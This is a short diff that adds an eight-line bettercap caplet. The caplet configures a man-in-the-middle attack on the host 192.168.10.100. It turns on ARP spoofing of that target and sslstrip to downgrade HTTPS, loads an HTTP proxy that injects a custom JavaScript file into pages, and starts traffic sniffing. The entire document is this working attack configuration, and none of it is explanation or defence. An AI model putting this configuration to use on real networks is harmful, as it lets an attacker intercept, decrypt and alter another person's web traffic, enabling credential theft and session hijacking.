@@ -1,0 +1,8 @@
+#create caplet
+set http.proxy.script /usr/local/share/bettercap/caplets/FOLDER/script.js
+set http.proxy.sslstrip true
+set net.sniff.verbose false
+set arp.spoof.targets 192.168.10.100
+arp.spoof on
+http.proxy on
+net.sniff on
